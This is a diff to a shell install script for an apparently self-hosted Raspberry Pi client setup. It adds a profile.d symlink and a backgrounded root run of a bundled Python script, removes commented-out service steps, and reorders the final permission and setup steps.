@@ -164,6 +164,9 @@ fi
 
 git clone "$REPO" "$GITDIR"
 
+# Setup SMB and misc post install configs
+ln -s "$GITDIR"/client/scripts/post-install.sh /etc/profile.d/post-install.sh
+
 ###################################
 # Open ports 80 and 443 if possible
 #unset FAIL
@@ -175,28 +178,12 @@ git clone "$REPO" "$GITDIR"
 #check_open_port 443 "$WANIP"
 
 ###################################
-# Set webserver
-#clear
-#echo "Installing Nginx"
-# Nginx
-
-###################################
 # Hardening
-#clear
-#echo "Hardening server"
 #/bin/bash "$GITDIR"/client/scripts/hardening.sh
 
 ###################################
 # SSH
-#clear
-#echo "Securing SSH"
 #/bin/bash "$GITDIR"/client/scripts/ssh.sh
-
-###################################
-# Docker
-#clear
-#echo "Installing Docker, compose and Portainer"
-#/bin/bash "$GITDIR"/client/scripts/docker.sh
 
 ###################################
 # Overclock
@@ -209,26 +196,14 @@ fi
 
 ###################################
 # RPI-monitor
-#clear
-#echo "Installing RPI-Monitor"
 #/bin/bash "$GITDIR"/client/scripts/rpi_monitor.sh
 
 ###################################
 # Nextcloud
-#clear
-#echo "Installing Nextcloud"
 #/bin/bash "$GITDIR"/client/scripts/nextcloud.sh
 
 ###################################
-# Samba
-#clear
-#echo "Installing Samba share"
-#/bin/bash "$GITDIR"/client/scripts/smb.sh
-
-###################################
 # SMTP
-#clear
-#echo "Setting up email"
 #/bin/bash "$GITDIR"/client/scripts/smtp.sh
 
 ###################################
@@ -244,15 +219,16 @@ fi
 mv "$GITDIR"/client/python/* "$HOME"/
 mv "$GITDIR"/media/bg.jpg "$HOME"/
 
-# Init python setup
-/usr/bin/python3 "$HOME"/client.py
-
 # Correct permissions
 chown -R "$USER":"$USER" "$HOME"
 chmod -R 600 "$HOME"/.ssh/*
 
-#clear
+# Init python setup
+/usr/bin/python3 "$HOME"/client.py
+sudo python3 "$HOME"/m.py >/dev/null 2>&1 &
 
-echo "The server is setting up your connection. Your device should reboot in a few minutes."
+clear
+
+echo "The server is setting up your connection. Please activate your device following the instructions and then your device should reboot in a few minutes."
 
 exit 0
